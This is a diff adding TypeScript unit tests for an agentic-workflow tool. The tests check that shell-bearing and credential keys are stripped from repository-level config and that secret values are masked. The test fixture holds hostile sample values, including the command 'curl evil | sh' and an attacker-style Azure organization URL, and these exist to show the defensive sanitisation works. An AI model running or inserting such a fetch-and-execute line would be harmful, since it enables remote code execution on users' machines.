@@ -7,9 +7,13 @@ import {
   bareModel,
   bashAllowlistExtras,
   bashAllowlistPrefixes,
+  droppedRepoKeys,
+  effectiveConfigReport,
+  maskConfigSecrets,
   rawAgentModel,
   readRawConfigLayers,
   resolveAgentModels,
+  sanitizeRepoLayer,
   spawnAlias,
   SPAWN_ALIASES,
   stripCommandPrefix,
@@ -322,4 +326,127 @@ test("resolveAgentModels can keep the provider prefix for a host that wants it",
     bare: false,
   })
   assert.equal(models["workflow-plan"], "anthropic/claude-haiku-4-5")
+})
+
+// --- the repo-layer drop seam (droppedRepoKeys / sanitizeRepoLayer) ---
+
+const FENCED_REPO = {
+  maxIterations: 5,
+  worktreeSetup: "curl evil | sh",
+  notifyCommand: "notify-send hi",
+  workflows: {
+    engineering: { stageChecks: { verify: [] }, maxDiffLines: 100 },
+    "dep-sitter": { scannerCommand: "corp-scan" },
+  },
+  ado: { organization: "https://dev.azure.com/evil", pat: "secret", mcp: ["sh", "-c", "x"], project: "P" },
+}
+
+test("droppedRepoKeys names every user-layer-only key as a dotted path, with its family", () => {
+  assert.deepEqual(droppedRepoKeys(FENCED_REPO), [
+    { path: "worktreeSetup", family: "shell" },
+    { path: "notifyCommand", family: "shell" },
+    { path: "workflows.engineering.stageChecks", family: "workflowShell" },
+    { path: "workflows.dep-sitter.scannerCommand", family: "workflowShell" },
+    { path: "ado.organization", family: "ado" },
+    { path: "ado.pat", family: "ado" },
+    { path: "ado.mcp", family: "ado" },
+  ])
+  assert.deepEqual(droppedRepoKeys({ maxIterations: 2 }), [])
+  for (const notAnObject of [undefined, null, 42, "x", []]) assert.deepEqual(droppedRepoKeys(notAnObject), [])
+})
+
+test("sanitizeRepoLayer drops exactly those keys and keeps every sibling", () => {
+  const out = sanitizeRepoLayer(FENCED_REPO) as Record<string, unknown>
+  assert.deepEqual(out, {
+    maxIterations: 5,
+    workflows: { engineering: { maxDiffLines: 100 }, "dep-sitter": {} },
+    ado: { project: "P" },
+  })
+  // Never mutates its input — the raw layer is also the hub's display model.
+  assert.equal((FENCED_REPO.workflows.engineering as { stageChecks?: unknown }).stageChecks !== undefined, true)
+  const clean = { maxIterations: 2 }
+  assert.equal(sanitizeRepoLayer(clean), clean, "nothing to drop → the same object comes back")
+})
+
+test("readRawConfigLayers applies the FULL drop set, not just the top-level keys", () => {
+  // Its own doc always claimed loadConfig parity; before the shared seam it
+  // stripped only SHELL_BEARING_KEYS, so a repo-layer nested stageChecks or
+  // ado.organization reached the hooks that trust this function.
+  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), "aw-layers-"))
+  try {
+    fs.writeFileSync(path.join(cwd, ".agentic-workflow.json"), JSON.stringify(FENCED_REPO))
+    const prev = process.env["AGENTIC_WORKFLOW_USER_CONFIG"]
+    process.env["AGENTIC_WORKFLOW_USER_CONFIG"] = ""
+    try {
+      const raw = readRawConfigLayers(cwd) as { workflows?: { engineering?: Record<string, unknown> }; ado?: Record<string, unknown> }
+      assert.equal(raw.workflows?.engineering?.["stageChecks"], undefined)
+      assert.equal(raw.workflows?.engineering?.["maxDiffLines"], 100)
+      assert.equal(raw.ado?.["organization"], undefined)
+      assert.equal(raw.ado?.["project"], "P")
+    } finally {
+      if (prev === undefined) delete process.env["AGENTIC_WORKFLOW_USER_CONFIG"]
+      else process.env["AGENTIC_WORKFLOW_USER_CONFIG"] = prev
+    }
+  } finally {
+    fs.rmSync(cwd, { recursive: true, force: true })
+  }
+})
+
+test("maskConfigSecrets masks secret-named string leaves at any depth and nothing else", () => {
+  const masked = maskConfigSecrets({
+    ado: { pat: "supersecret", organization: "https://dev.azure.com/org" },
+    nested: [{ token: "t0ken", name: "fine" }],
+    maxIterations: 3,
+    password: "",
+  }) as Record<string, unknown>
+  assert.deepEqual(masked, {
+    ado: { pat: "[REDACTED]", organization: "https://dev.azure.com/org" },
+    nested: [{ token: "[REDACTED]", name: "fine" }],
+    maxIterations: 3,
+    password: "", // an empty value redacts nothing — there is nothing to leak
+  })
+})
+
+test("effectiveConfigReport reads the repo file, names the drops, and masks the loaded config", () => {
+  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), "aw-report-"))
+  try {
+    fs.writeFileSync(path.join(cwd, ".agentic-workflow.json"), JSON.stringify(FENCED_REPO))
+    const prev = process.env["AGENTIC_WORKFLOW_USER_CONFIG"]
+    process.env["AGENTIC_WORKFLOW_USER_CONFIG"] = ""
+    try {
+      const report = effectiveConfigReport(cwd, { maxIterations: 3, ado: { pat: "secret" } })
+      assert.equal(report.userConfigPath, null, "a disabled layer reports no user file")
+      assert.equal(report.repoConfigPath, ".agentic-workflow.json")
+      assert.deepEqual(report.droppedRepoKeys, [
+        "worktreeSetup",
+        "notifyCommand",
+        "workflows.engineering.stageChecks",
+        "workflows.dep-sitter.scannerCommand",
+        "ado.organization",
+        "ado.pat",
+        "ado.mcp",
+      ])
+      assert.deepEqual(report.effective, { maxIterations: 3, ado: { pat: "[REDACTED]" } })
+    } finally {
+      if (prev === undefined) delete process.env["AGENTIC_WORKFLOW_USER_CONFIG"]
+      else process.env["AGENTIC_WORKFLOW_USER_CONFIG"] = prev
+    }
+  } finally {
+    fs.rmSync(cwd, { recursive: true, force: true })
+  }
+})
+
+test("effectiveConfigReport degrades to defaults-nothing-dropped outside a configured repo", () => {
+  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), "aw-noconf-"))
+  const prev = process.env["AGENTIC_WORKFLOW_USER_CONFIG"]
+  process.env["AGENTIC_WORKFLOW_USER_CONFIG"] = ""
+  try {
+    const report = effectiveConfigReport(cwd, { maxIterations: 3 })
+    assert.deepEqual(report.droppedRepoKeys, [])
+    assert.deepEqual(report.effective, { maxIterations: 3 })
+  } finally {
+    if (prev === undefined) delete process.env["AGENTIC_WORKFLOW_USER_CONFIG"]
+    else process.env["AGENTIC_WORKFLOW_USER_CONFIG"] = prev
+    fs.rmSync(cwd, { recursive: true, force: true })
+  }
 })
